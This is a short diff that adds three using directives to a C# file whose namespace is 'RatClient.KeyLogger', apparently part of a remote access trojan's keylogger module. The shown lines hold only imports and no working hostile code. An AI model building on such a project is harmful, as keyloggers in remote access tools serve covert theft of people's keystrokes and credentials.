@@ -1,8 +1,11 @@
-﻿using Microsoft.Win32;
+﻿using System;
+using Microsoft.Win32;
 using System.Runtime.InteropServices;
+using System.Threading;
 using System.Windows.Forms;
 using System.Text;
 using System.Text.RegularExpressions;
+using System.Collections.Generic;
 using System.IO.MemoryMappedFiles;
 
 namespace RatClient.KeyLogger
